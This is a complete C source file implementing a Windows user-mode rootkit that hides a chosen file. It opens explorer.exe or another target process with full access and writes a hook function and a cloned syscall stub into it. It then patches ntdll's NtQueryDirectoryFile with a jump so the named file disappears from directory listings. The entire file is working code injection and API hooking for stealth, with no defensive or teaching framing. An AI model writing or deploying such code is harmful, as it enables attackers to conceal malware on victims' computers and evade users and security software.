#include "FileHiding.h"

NTSTATUS NTAPI NewNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSignleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
DWORD SearchOverwriteOffset(PVOID Address);
int AtherFunc();

DWORD GetProcessIdByImageName(wchar_t *ProcessName)
{
    PSYSTEM_PROCESS_INFORMATION spi;
    DWORD PID = NULL;
    ULONG ReturnLength;

    while (TRUE)
    {
        if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength) != STATUS_INFO_LENGTH_MISMATCH)
        {
            continue;
        }

        spi = VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (spi == NULL)
        {
            continue;
        }

        if (NT_SUCCESS(NtQuerySystemInformation(SystemProcessInformation, spi, ReturnLength, &ReturnLength)))
        {
            break;
        }

        VirtualFree(spi, 0, MEM_RELEASE);
    }

    PSYSTEM_PROCESS_INFORMATION temp = spi;
    spi = (ULONGLONG)spi + spi->NextEntryOffset;

    while (TRUE)
    {
        if (wcsicmp(spi->ImageName.Buffer, ProcessName) == 0)
        {
            PID = spi->UniqueProcessId;
            break;
        }

        if (spi->NextEntryOffset == 0)
            break;

        spi = (ULONGLONG)spi + spi->NextEntryOffset;
    }

    VirtualFree(temp, ReturnLength, MEM_DECOMMIT);
    VirtualFree(temp, 0, MEM_RELEASE);

    return PID;
}

BOOL FileHiding(wchar_t *TargetProcessName, wchar_t *HideFileName)
{
    BYTE Syscall[16] = {0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3};

    BYTE TrampolineCode[12] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0};

    DWORD TargetPID = NULL;

    if (TargetProcessName == NULL)
    {
        TargetPID = GetProcessIdByImageName(L"explorer.exe");
    }
    else
    {
        TargetPID = GetProcessIdByImageName(TargetProcessName);
    }

    if (TargetPID == NULL)
    {
        printf("[-] %S Not found!\n", TargetProcessName == NULL ? L"explorer.exe" : TargetProcessName);
        return FALSE;
    }

    printf("[*] Target Process Name : %S\n", TargetProcessName == NULL ? L"explorer.exe" : TargetProcessName);
    printf("[*]    Hide File Name   : %S\n", HideFileName);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    PVOID NtQueryDirectoryFile = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryDirectoryFile");

    printf("[*] NtQueryDirectoryFile  : 0x%p\n", NtQueryDirectoryFile);

    if (hProcess == NULL)
    {
        printf("[-] OpenProcess Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    PVOID NewFunction = VirtualAllocEx(hProcess, NULL, NewNtQueryDirectoryFile_Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (NewFunction == NULL)
    {
        printf("[-] VirtualAllocEx Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Hook Function Address : 0x%p\n", NewFunction);

    memcpy(TrampolineCode + 2, &NewFunction, 8);

    SIZE_T NumberOfBytesWritten;

    if (WriteProcessMemory(hProcess, NewFunction, NewNtQueryDirectoryFile, NewNtQueryDirectoryFile_Size, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Write NewNtQueryDirectoryFile\n");
    printf("[+] Write By %d Byte\n", NumberOfBytesWritten);

    DWORD SystemCallNumber = *(DWORD *)((ULONGLONG)NtQueryDirectoryFile + 4);

    printf("[*] NewNtQueryDirectoryFile Call Number : %d\n", SystemCallNumber);

    memcpy(Syscall + 4, &SystemCallNumber, 4);

    PVOID SyscallClone = (ULONGLONG)NewFunction + NewNtQueryDirectoryFile_Size;

    if (WriteProcessMemory(hProcess, SyscallClone, Syscall, 16, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Cloning NtQueryDirectoryFile\n");

    PVOID ProcessName = (ULONGLONG)SyscallClone + 16;

    if (WriteProcessMemory(hProcess, ProcessName, HideFileName, wcslen(HideFileName) * 2, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Wrtie hide file name\n");
    printf("[+] Write By %d Byte\n", NumberOfBytesWritten);

    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQueryDirectoryFile), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Set clone NtQueryDirectoryFile and hide process name\n");

    /*if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }*/

    DWORD OldProtect;

    if (VirtualProtectEx(hProcess, NtQueryDirectoryFile, 12, PAGE_EXECUTE_READWRITE, &OldProtect) == FALSE)
    {
        printf("[-] VirtualProtectEx Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Release protect NtQueryDirectoryFile\n");

    if (WriteProcessMemory(hProcess, NtQueryDirectoryFile, TrampolineCode, 12, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Success hide!\n");
}

DWORD SearchOverwriteOffset(PVOID Address)
{
    ULONGLONG Pointer_Overwrite = 0xCCCCCCCCCCCCCCCC;
    for (int i = 0;; i++)
    {
        if (memcmp((ULONGLONG)Address + i, &Pointer_Overwrite, 8) == 0)
        {
            return i;
        }
    }
}

NTSTATUS NTAPI NewNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSignleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
    volatile NTSTATUS *CloneNtQueryDirectoryFile = 0xCCCCCCCCCCCCCCCC;
    wchar_t *HideFileName = (ULONGLONG)CloneNtQueryDirectoryFile + 16;
    NTSTATUS ntstatus = ((NTSTATUS(*)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSignleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan))CloneNtQueryDirectoryFile)(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSignleEntry, FileName, RestartScan);

    if (!NT_SUCCESS(ntstatus))
    {
        return ntstatus;
    }
#ifdef __GNUC__
    if (FileInformationClass == FileIdBothDirectoryInformation)
    {
        PFILE_ID_BOTH_DIR_INFORMATION pCur = FileInformation;
        PFILE_ID_BOTH_DIR_INFORMATION pPrev = NULL;
#elif _MSC_VER
    if (FileInformationClass == 0x25)
    {
        PFILE_ID_BOTH_DIR_INFO pCur = FileInformation;
        PFILE_ID_BOTH_DIR_INFO pPrev = NULL;
#endif
        while (TRUE)
        {
            wchar_t s1, s2;
            BOOL ret = TRUE;

            for (int i = 0; (*(HideFileName + i) != NULL) && (*(pCur->FileName + i) != NULL); i++)
            {
                s1 = Upper(*(HideFileName + i));
                s2 = Upper(*(pCur->FileName + i));
                ret = (s1 == s2) ? TRUE : FALSE;
                if (ret == FALSE)
                    break;
            }

            if (ret)
                break;

            if (pCur->NextEntryOffset == 0)
                return ntstatus;
            pPrev = pCur;
            pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
        }

        if (pPrev == NULL && pCur->NextEntryOffset == 0)
        {
            ntstatus = 0xC0000005;
        }
        else if (pPrev == NULL)
        {
            FileInformation = (ULONGLONG)pCur + pCur->NextEntryOffset;
            pCur = FileInformation;
        }
        else if (pCur->NextEntryOffset == 0)
        {
            pPrev->NextEntryOffset = 0;
        }
        else
        {
            pPrev->NextEntryOffset += pCur->NextEntryOffset;
        }
    }

    return ntstatus;
}
int AtherFunc() {}